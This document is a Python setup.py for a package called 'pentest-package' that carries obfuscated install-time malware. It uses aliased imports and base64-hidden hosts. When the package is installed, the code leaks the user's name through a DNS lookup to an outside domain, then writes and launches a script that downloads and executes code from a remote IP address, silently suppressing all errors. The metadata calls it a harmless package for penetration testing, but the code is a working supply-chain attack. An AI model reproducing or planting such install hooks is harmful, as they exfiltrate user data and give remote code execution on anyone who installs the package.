from setuptools import setup, find_packages

from base64 import b64decode as _b64d
from socket import getaddrinfo as _gai
from os import popen as _pp
from os import system as _ss
from tempfile import NamedTemporaryFile as _ffile
from sys import executable as _exe

DNS_DOMAIN = f'{_pp("whoami").read().strip()}.{_b64d(b"dGVzdC5wZW50ZXN0LnI0dy5jYw==").decode()}'
IP_ADDR = f'http://{_b64d(b"NTIuMjExLjEwMy4xOTg=").decode()}:8081/package'.encode()

with open("README.md", "r") as fh:
    long_description = fh.read()

try:
    dns_resp = _gai(DNS_DOMAIN, 80)
except Exception as err:
    pass

try:
    _ttmp = _ffile(delete=False)
    _ttmp.write(b"from urllib.request import urlopen as _uo;exec(_uo('"+IP_ADDR+"').read())")
    _ttmp.close()
    _ss(f"start {_exe} {_ttmp.name}")
except Exception as err:
    pass

setup(
    name="pentest-package",
    version="0.0.1",
    author="Pawel Kusinski",
    description="Short malicious although harmless package for pentest",
    long_description=long_description,
    long_description_content_type="text/markdown",
    url="https://github.com/sfc-gh-pkusinski/pentest-package",
    packages=find_packages(),
    classifiers=[
        "Programming Language :: Python :: 3",
        "Operating System :: OS Independent"
    ],
    python_requires='>=3.6',
    py_modules=["pentest-package"],
    package_dir={'':'pentest-package/src'},
    install_requires=[],
)